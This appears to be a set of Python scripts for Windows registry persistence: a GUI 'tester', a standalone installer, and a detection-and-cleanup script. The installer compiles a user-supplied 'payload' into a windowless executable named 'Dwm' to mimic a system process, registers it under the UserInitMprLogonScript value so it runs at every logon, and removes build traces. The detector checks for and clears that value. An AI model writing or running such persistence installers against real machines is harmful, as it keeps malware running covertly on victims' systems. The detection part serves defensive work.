import os
import shutil
import tkinter as tk
from tkinter import filedialog, messagebox
import PyInstaller.__main__
import winreg


class PersistenceGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Windows Registry Persistence Tester (Python 3)")
        self.root.geometry("600x300")

        self.filename = ""
        self.exe_name = "Dwm"

        self.create_widgets()

    def create_widgets(self):
        self.file_label = tk.Label(self.root, text="Selected Python File: None")
        self.file_label.pack(pady=10)

        self.select_button = tk.Button(self.root, text="Select Python File", command=self.select_file)
        self.select_button.pack()

        self.build_button = tk.Button(self.root, text="Build Executable", command=self.build_exe)
        self.build_button.pack(pady=5)

        self.persist_button = tk.Button(self.root, text="Set Registry Persistence", command=self.set_persistence)
        self.persist_button.pack(pady=5)

        self.verify_button = tk.Button(self.root, text="Verify Persistence", command=self.verify_persistence)
        self.verify_button.pack(pady=5)

        self.remove_button = tk.Button(self.root, text="Remove Persistence", command=self.remove_persistence)
        self.remove_button.pack(pady=5)

    def select_file(self):
        self.filename = filedialog.askopenfilename(filetypes=[("Python Files", "*.py")])
        self.file_label.config(text="Selected File: {}".format(self.filename))

    def build_exe(self):
        if not self.filename:
            messagebox.showerror("Error", "Please select a Python file first.")
            return

        try:
            PyInstaller.__main__.run([
                '--onefile',
                '--noconsole',
                '--name={}'.format(self.exe_name),
                self.filename
            ])

            exe_path = os.path.join('dist', self.exe_name + ".exe")
            if os.path.exists(exe_path):
                shutil.move(exe_path, os.getcwd())
                messagebox.showinfo("Success", "Executable created: {}.exe".format(self.exe_name))

            for folder in ['dist', 'build', '__pycache__']:
                if os.path.isdir(folder):
                    shutil.rmtree(folder)

            spec_file = self.exe_name + ".spec"
            if os.path.exists(spec_file):
                os.remove(spec_file)

        except Exception as e:
            messagebox.showerror("Build Error", str(e))

    def set_persistence(self):
        try:
            exe_path = os.path.abspath(self.exe_name + ".exe")
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment", 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "UserInitMprLogonScript", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            messagebox.showinfo("Persistence", "Registry persistence set successfully.")
        except Exception as e:
            messagebox.showerror("Registry Error", str(e))

    def verify_persistence(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment", 0, winreg.KEY_READ)
            value, regtype = winreg.QueryValueEx(key, "UserInitMprLogonScript")
            winreg.CloseKey(key)
            messagebox.showinfo("Verification", "Persistence Found:\nUserInitMprLogonScript = {}".format(value))
        except FileNotFoundError:
            messagebox.showinfo("Verification", "No persistence entry found.")
        except Exception as e:
            messagebox.showerror("Verification Error", str(e))

    def remove_persistence(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "UserInitMprLogonScript")
            winreg.CloseKey(key)
            messagebox.showinfo("Removal", "Persistence registry entry removed.")
        except FileNotFoundError:
            messagebox.showinfo("Removal", "No persistence entry to remove.")
        except Exception as e:
            messagebox.showerror("Removal Error", str(e))


if __name__ == "__main__":
    root = tk.Tk()
    app = PersistenceGUI(root)
    root.mainloop()
# set_persistence.py
import os
import shutil
import winreg
import PyInstaller.__main__

def build_exe(script, output_name="Dwm", icon_path=None):
    if not os.path.isfile(script):
        raise Exception("Script not found: {}".format(script))

    args = [
        '--onefile',
        '--noconsole',
        '--name={}'.format(output_name),
        script
    ]
    if icon_path:
        args.append('--icon={}'.format(icon_path))

    PyInstaller.__main__.run(args)

    # Move EXE to working dir
    built_exe = os.path.join("dist", output_name + ".exe")
    if os.path.exists(built_exe):
        shutil.move(built_exe, os.getcwd())

    # Cleanup
    for item in ['build', 'dist', '__pycache__', '{}.spec'.format(output_name)]:
        if os.path.exists(item):
            try:
                if os.path.isdir(item):
                    shutil.rmtree(item)
                else:
                    os.remove(item)
            except:
                pass

    return os.path.abspath(output_name + ".exe")

def set_registry_persistence(exe_path):
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment", 0, winreg.KEY_WRITE)
    winreg.SetValueEx(key, "UserInitMprLogonScript", 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(key)

if __name__ == "__main__":
    script_file = "your_payload.py"  # replace this with your actual script
    exe_path = build_exe(script_file)
    set_registry_persistence(exe_path)
    print("[+] Persistence set for:", exe_path)


#detect_persistence.py

#!/usr/bin/env python3

import os
import sys
import json
from datetime import datetime
import winreg

REG_HIVE = winreg.HKEY_CURRENT_USER
REG_PATH = r"Environment"
REG_VALUE_NAME = "UserInitMprLogonScript"

def query_logon_script():
    try:
        reg = winreg.ConnectRegistry(None, REG_HIVE)
        key = winreg.OpenKey(reg, REG_PATH, 0, winreg.KEY_READ)
        value, regtype = winreg.QueryValueEx(key, REG_VALUE_NAME)
        winreg.CloseKey(key)
        reg.Close()
        return value.strip() if value else None
    except FileNotFoundError:
        return None
    except Exception as e:
        print("[!] Registry access error: {}".format(e))
        return None

def get_file_metadata(path):
    if not path or not os.path.isfile(path):
        return None
    stat = os.stat(path)
    return {
        "exists": True,
        "size_bytes": stat.st_size,
        "created": datetime.fromtimestamp(stat.st_ctime).isoformat(),
        "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
    }

def clear_logon_script():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, REG_VALUE_NAME)
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False
    except Exception as e:
        print("[!] Failed to clear registry value: {}".format(e))
        return False

def main():
    fix = "--fix" in sys.argv
    json_out = "--json" in sys.argv

    result = {
        "configured": False,
        "script_path": None,
        "file_info": None,
        "action_taken": None,
    }

    path = query_logon_script()
    if path:
        result["configured"] = True
        result["script_path"] = path
        result["file_info"] = get_file_metadata(path)

        if not json_out:
            print("[!] Persistence Detected:")
            print("    Registry Key: HKCU\\{}\\{}".format(REG_PATH, REG_VALUE_NAME))
            print("    Script Path : {}".format(path))
            if result["file_info"]:
                print("    File Size   : {} bytes".format(result["file_info"]["size_bytes"]))
                print("    Created     : {}".format(result["file_info"]["created"]))
                print("    Modified    : {}".format(result["file_info"]["modified"]))
            else:
                print("    File exists : NO")
    else:
        if not json_out:
            print("[+] No persistence detected.")

    if fix and result["configured"]:
        if not json_out:
            confirm = input("Clear the registry value? [y/N]: ").strip().lower()
            if confirm != "y":
                print("[*] No changes made.")
                return
        result["action_taken"] = "cleared" if clear_logon_script() else "clear_failed"

    if json_out:
        print(json.dumps(result, indent=2))

if __name__ == "__main__":
    main()

# set_persistence.py excute into a single file EXE
pyinstaller --onefile set_persistence.py


